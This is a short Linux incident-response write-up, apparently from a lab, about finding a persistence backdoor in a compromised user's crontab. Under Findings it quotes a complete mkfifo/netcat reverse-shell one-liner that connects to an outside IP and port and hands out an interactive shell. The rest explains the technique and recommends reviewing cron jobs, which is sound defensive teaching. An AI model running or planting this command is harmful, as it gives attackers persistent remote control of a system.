 Scheduled Task Investigation – User Crontab

#### Objective
Identify malicious persistence mechanisms established through scheduled tasks owned by the compromised user account.

---

#### Method Used

```bash
crontab -l

```
The user’s crontab was listed to review scheduled jobs that execute automatically at defined intervals, which are commonly abused by attackers to maintain persistence.

## Findings

Malicious Cron Job Identified
```bash
/usr/bin/rm /tmp/f;
/usr/bin/mkfifo /tmp/f;
/usr/bin/cat /tmp/f | /bin/sh -i 2>&1 |
/usr/bin/nc 172.10.6.9 6969 >/tmp/f

```
## Analysis

The scheduled task creates a named pipe (/tmp/f) and uses it to establish a reverse shell connection to an external IP address over TCP port 6969. Netcat (nc) is used to relay an interactive shell back to the attacker.

This technique:

Avoids writing a traditional script to disk

Executes using standard system binaries

Enables persistent remote access

Because the command is executed automatically via cron, the attacker regains access even after system reboots or user logouts.

## Why This Matters

Cron jobs are a high-risk persistence vector because they:

Execute without user interaction

Are often overlooked during casual inspections

Can run with elevated privileges

Reviewing scheduled tasks with crontab -l is a mandatory step during Linux incident response to uncover time-based backdoors and automated attacker access.
